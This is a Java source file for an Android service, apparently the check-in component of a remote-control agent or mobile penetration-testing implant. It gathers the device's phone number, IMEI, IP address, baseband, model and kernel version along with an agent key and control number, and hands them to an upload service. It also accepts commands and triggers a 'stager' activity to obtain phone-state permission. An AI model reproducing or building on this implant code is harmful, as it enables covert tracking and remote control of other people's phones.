package com.shevirah.androidagent;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;
import android.support.v4.content.ContextCompat;
import static com.shevirah.androidagent.Util.createFile;
import static com.shevirah.androidagent.Util.getIPAddress;
import static com.shevirah.androidagent.Util.getSystemProperty;
import static com.shevirah.androidagent.Util.printExtras;

public class CheckinService extends Service {
    private static final String TAG = "Checkin";
    public static final String EXTRA_RETURN_METHOD = "returnmethod";
    public static final String EXTRA_COMMAND = "command";
    String granted = "false";
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startID) {
        if (Const.DEBUG) printExtras(TAG, intent.getExtras(), "args ");

        try {
            onStart(intent);
        } catch (Exception e) {
            if (Const.DEBUG) Log.e(TAG, "", e);
        }
    }

    private void onStart(Intent intent) {
        String ret = intent.getStringExtra(EXTRA_RETURN_METHOD);
        String body = intent.getStringExtra(EXTRA_COMMAND);

        if (ret.equals("WEB")) {
            startCommandHandler(body);
        }



    }

    private void startCommandHandler(String body) {
        Intent intent = new Intent(this, WebUploadService.class);
        intent.putExtra(WebUploadService.EXTRA_STRING_TO_UPLOAD, getFullPhoneInfo());
        intent.putExtra(WebUploadService.EXTRA_COMMAND, body);
        if (granted.equals("true")) {
            startService(intent);
        }
    }

    private String getFullPhoneInfo() {
        String number = null;
        String imei = null;
        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            Intent intent = new Intent(this, StagerActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("command", "BLAH ATTA WEB");
            startActivity(intent);
            granted = "false";
            return "false";

        } else {
            try {
                number = PhoneHelper.getPhoneNumber(this);
                imei = PhoneHelper.getDeviceId(this);
            } catch (SecurityException e) {
                if (Const.DEBUG) Log.e(TAG, "getFullPhoneInfo: ", e);
            }

                createFile(getFilesDir() + "/" + HttpPollingService.CONNECTED);
                granted = "true";

            return getString(R.string.agentkey) + ","
                    + number + ","
                    + "Android" + ","
                    + getString(R.string.controlnumber) + ","
                    + Build.VERSION.SDK_INT + ","
                    + imei + ","
                    + getIPAddress(true) + ","
                    + getSystemProperty("getprop gsm.version.baseband") + ","
                    + Build.MODEL + ","
                    + System.getProperty("os.version");/*kernel*/
        }
    }
}
